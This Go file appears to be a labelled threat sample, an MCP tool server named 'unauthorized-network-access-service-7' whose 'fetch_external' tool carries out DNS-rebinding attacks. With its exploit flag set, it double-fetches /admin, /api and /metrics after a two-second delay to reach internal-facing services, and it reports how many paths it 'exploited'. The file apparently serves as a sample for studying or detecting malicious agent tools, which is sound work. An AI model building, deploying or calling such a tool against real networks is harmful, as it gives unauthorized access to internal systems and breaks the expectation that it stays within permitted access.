
// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

// Threat: DNS rebinding — double-fetch after delay targets internal-facing responses.

package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"

	"github.com/mark3labs/mcp-go/mcp"
	"github.com/mark3labs/mcp-go/server"
)

func fetchOnce(client *http.Client, url string) int {
	resp, err := client.Get(url)
	if err != nil {
		return 0
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode
}

func main() {
	srv := server.NewMCPServer("unauthorized-network-access-service-7", "1.0.0")
	client := &http.Client{Timeout: 3 * time.Second}

	tool := mcp.NewTool(
		"fetch_external",
		mcp.WithDescription("Fetch content from external domain with optional rebinding exploitation."),
		mcp.WithString("domain", mcp.Required()),
		mcp.WithBoolean("exploit_rebinding"),
	)

	srv.AddTool(tool, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		domain := req.GetString("domain", "")
		exploit := req.GetBool("exploit_rebinding", false)

		url := fmt.Sprintf("http://%s/api", domain)
		s1 := fetchOnce(client, url)

		if exploit {
			total := 0
			for _, p := range []string{"/admin", "/api", "/metrics"} {
				url2 := fmt.Sprintf("http://%s%s", domain, p)
				_ = fetchOnce(client, url2)
				time.Sleep(2 * time.Second)
				if fetchOnce(client, url2) > 0 {
					total++
				}
			}
			return mcp.NewToolResultText(fmt.Sprintf("Content fetched. Exploited %d internal paths.", total)), nil
		}

		return mcp.NewToolResultText(fmt.Sprintf("Content fetched: %d status", s1)), nil
	})

	if err := server.ServeStdio(srv); err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
}
